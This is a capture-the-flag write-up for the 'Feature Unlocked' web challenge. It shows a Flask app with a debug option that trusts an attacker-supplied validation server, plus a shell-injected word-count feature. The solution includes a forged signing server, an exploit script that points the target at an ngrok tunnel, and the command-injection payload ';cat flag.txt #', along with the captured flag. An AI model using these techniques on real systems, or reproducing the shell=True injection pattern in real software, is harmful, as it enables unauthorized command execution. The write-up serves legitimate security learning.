+++
title = 'Feature Unlocked'
tags = [
  "Web",
  "Python",
  "SSRF",
  "50 points",
  "184 solves",
  "cryptocat",
]
date = 2024-09-02T10:59:31+02:00
draft = true
+++

<h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>Feature unlocked</h1>

**Description**: The world's coolest app has a brand new feature! Too bad it's not released until after the CTF..

**Link**: <https://feature-unlocked-web-challs.csc.tf/>

## Introduction

Feature unlocked is part of the first wave of the web and is one of the first challanges I solved. Made by cryptocat, who we salute, it is a fairly simple challange if you read the code correctly.

## Source

```python
# filename: main.py

import subprocess
import base64
import json
import time
import requests
import os
from flask import Flask, request, render_template, make_response, redirect, url_for
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS
from itsdangerous import URLSafeTimedSerializer

app = Flask(__name__)
app.secret_key = os.urandom(16)
serializer = URLSafeTimedSerializer(app.secret_key)

DEFAULT_VALIDATION_SERVER = 'http://127.0.0.1:1338'
NEW_FEATURE_RELEASE = int(time.time()) + 7 * 24 * 60 * 60
DEFAULT_PREFERENCES = base64.b64encode(json.dumps({
    'theme': 'light',
    'language': 'en'
}).encode()).decode()


def get_preferences():
    preferences = request.cookies.get('preferences')
    if not preferences:
        response = make_response(render_template(
            'index.html', new_feature=False))
        response.set_cookie('preferences', DEFAULT_PREFERENCES)
        return json.loads(base64.b64decode(DEFAULT_PREFERENCES)), response
    return json.loads(base64.b64decode(preferences)), None


@app.route('/')
def index():
    _, response = get_preferences()
    return response if response else render_template('index.html', new_feature=False)


@app.route('/release')
def release():
    token = request.cookies.get('access_token')
    if token:
        try:
            data = serializer.loads(token)
            if data == 'access_granted':
                return redirect(url_for('feature'))
        except Exception as e:
            print(f"Token validation error: {e}")

    validation_server = DEFAULT_VALIDATION_SERVER
    if request.args.get('debug') == 'true':
        preferences, _ = get_preferences()
        validation_server = preferences.get(
            'validation_server', DEFAULT_VALIDATION_SERVER)

    if validate_server(validation_server):
        response = make_response(render_template(
            'release.html', feature_unlocked=True))
        token = serializer.dumps('access_granted')
        response.set_cookie('access_token', token, httponly=True, secure=True)
        return response

    return render_template('release.html', feature_unlocked=False, release_timestamp=NEW_FEATURE_RELEASE)


@app.route('/feature', methods=['GET', 'POST'])
def feature():
    token = request.cookies.get('access_token')
    if not token:
        return redirect(url_for('index'))

    try:
        data = serializer.loads(token)
        if data != 'access_granted':
            return redirect(url_for('index'))

        if request.method == 'POST':
            to_process = request.form.get('text')
            try:
                word_count = f"echo {to_process} | wc -w"
                output = subprocess.check_output(
                    word_count, shell=True, text=True)
            except subprocess.CalledProcessError as e:
                output = f"Error: {e}"
            return render_template('feature.html', output=output)

        return render_template('feature.html')
    except Exception as e:
        print(f"Error: {e}")
        return redirect(url_for('index'))


def get_pubkey(validation_server):
    try:
        response = requests.get(f"{validation_server}/pubkey")
        response.raise_for_status()
        return ECC.import_key(response.text)
    except requests.RequestException as e:
        raise Exception(
            f"Error connecting to validation server for public key: {e}")


def validate_access(validation_server):
    pubkey = get_pubkey(validation_server)
    try:
        response = requests.get(validation_server)
        response.raise_for_status()
        data = response.json()
        date = data['date'].encode('utf-8')
        signature = bytes.fromhex(data['signature'])
        verifier = DSS.new(pubkey, 'fips-186-3')
        verifier.verify(SHA256.new(date), signature)
        return int(date)
    except requests.RequestException as e:
        raise Exception(f"Error validating access: {e}")


def validate_server(validation_server):
    try:
        date = validate_access(validation_server)
        return date >= NEW_FEATURE_RELEASE
    except Exception as e:
        print(f"Error: {e}")
    return False


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337)


```

```python
# filename: validation.py

from flask import Flask, jsonify
import time
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS

app = Flask(__name__)

key = ECC.generate(curve='p256')
pubkey = key.public_key().export_key(format='PEM')


@app.route('/pubkey', methods=['GET'])
def get_pubkey():
    return pubkey, 200, {'Content-Type': 'text/plain; charset=utf-8'}


@app.route('/', methods=['GET'])
def index():
    date = str(int(time.time()))
    h = SHA256.new(date.encode('utf-8'))
    signature = DSS.new(key, 'fips-186-3').sign(h)

    return jsonify({
        'date': date,
        'signature': signature.hex()
    })


if __name__ == '__main__':
    app.run(host='127.0.0.1', port=1338)

```

The application is divided into two parts: the main one, where we find the web application, and a server used to validate the access token with the access_garantied parameter for the release of the feature.

One thing that immediately stands out is a part of the main code where a debug mode is given.

```python
if request.args.get('debug') == 'true':
  preferences, _ = get_preferences()
  validation_server = preferences.get(
  'validation_server', DEFAULT_VALIDATION_SERVER)
```

If the get arguments have the `debug=true` option, it will take the validation server from our preferences, which we remember to be a simple base64 cookie from a json so easily replicable.

## Solution

What we can do is give the application its own validation server, which is simply a copy of our own, except that we can change the date of the server to make the feature.

```python
# filename: evil_validation.py


from flask import Flask, jsonify
import time
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS

app = Flask(__name__)

key = ECC.generate(curve='p256')
pubkey = key.public_key().export_key(format='PEM')


@app.route('/pubkey', methods=['GET'])
def get_pubkey():
    print("Pubkey: " + pubkey)
    return pubkey, 200, {'Content-Type': 'text/plain; charset=utf-8'}


@app.route('/', methods=['GET'])
def index():
    date = str(int(time.time()) + 7 * 24 * 60 * 60)
    h = SHA256.new(date.encode('utf-8'))
    signature = DSS.new(key, 'fips-186-3').sign(h)

    print("Date: " + date)
    print("Signature: " + signature.hex())
    print("Validating signature...")

    print(jsonify({
        'date': date,
        'signature': signature.hex()
    }))

    return jsonify({
        'date': date,
        'signature': signature.hex()
    })


if __name__ == '__main__':
    app.run(host='127.0.0.1', port=1338)

```

```python
# filename: exploit.py

#!/usr/bin/python3

import base64
import requests
import json
from bs4 import BeautifulSoup

BASE_URL = "https://feature-unlocked-web-challs.csc.tf"
URL_HOOK = "https://3fcb-79-33-159-173.ngrok-free.app" # ngrok tunnel with evil_validation.py in listening (so run python3 evil_validation; ngrok http 1338 )

s = requests.Session()

def get_validation():

  preference = base64.b64encode(json.dumps({
      'theme': 'light',
      'language': 'en',
      'validation_server': URL_HOOK
  }).encode()).decode()

  r = s.get(f"{BASE_URL}/release", params={"debug": "true"},
            cookies={"preferences": preference})

  print(f"{s.cookies=}")

def get_flag():
  payload = ';cat flag.txt #' # Bypass for  word_count = f"echo {to_process} | wc -w"
  r = s.post(f"{BASE_URL}/feature",data={"text":payload})
  soup = BeautifulSoup(r.text, 'html.parser')
  print("Flag: " + (soup.find('pre').text).strip())

def main():
  get_validation()
  get_flag()


if __name__ == "__main__":
  main()

# goodluck by @akiidjk

```

```stdout
$ flag: CSCTF{d1d_y0u_71m3_7r4v3l_f0r_7h15_fl46?!}
```

<p align='right'>Author: akiidjk </p>
